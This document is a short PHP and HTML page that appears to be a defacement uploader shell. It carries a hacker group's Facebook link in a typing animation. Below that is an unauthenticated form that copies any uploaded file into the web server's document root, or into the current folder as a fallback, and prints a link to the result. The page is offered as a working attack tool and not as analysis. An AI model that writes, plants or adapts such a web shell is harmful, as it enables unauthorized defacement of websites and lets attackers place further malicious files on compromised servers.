<!DOCTYPE HTML>
<html><head>
<link rel="icon" type="image/png/ico" href="x.jpg">
<meta content="Upload Files" name="description"/>
<script type="text/javascript" src="http://code.jquery.com/jquery-2.1.1.js"></script>
<center><img src="https://i.imgur.com/f8szFZd.gif" width="250" height="250"></center>
<font color=black>
<script>
var text="https://www.facebook.com/BangladeshCyberGho5t";
var delay=10;
var currentChar=1;
var destination="[none]";
function type()
{
//if (document.all)
{
var dest=document.getElementById(destination);
if (dest)// && dest.innerHTML)
{
dest.innerHTML=text.substr(0, currentChar)+"<blink>_</blink>";
currentChar++;
if (currentChar>text.length)
{
currentChar=1;
setTimeout("type()", 5000);
}
else
{
setTimeout("type()", delay);
}
}
}
}
function startTyping(textParam, delayParam, destinationParam)
{
text=textParam;
delay=delayParam;
currentChar=1;
destination=destinationParam;
type();
}
</script><center><b><div 0px="" 12px="" ComicSansMs="" color:="" FC0707="" font:="" id="textDestination" margin:="" style="background-color: none;"></div></b><script language="JavaScript">
javascript:startTyping(text, 50, "textDestination");
</script></center>
<style>
*{
	margin-top:1px;
}
body{
    background-position: center;
	background-color:#f1f1f1;
    height:99%;
    width:99%;
    background-attachment: fixed;
    background-size:100% 100%;
}
</style>
<center><?php
echo "Here To Upload Deface Home Or Normal<br>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='just_file' style='border:1px solid;'>
	  <input type='submit' name='upload' value='Upload'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['just_file']['name'] ?? "";
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['just_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "success -> <a href='$web$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "failed to upload file in root document.";
		}
	} else {
		if(@copy($_FILES['just_file']['tmp_name'], $files)) {
			echo " upload <b>$files</b> in this folder";
		} else {
			echo "failed to take action..";
		}
	}
}
?> 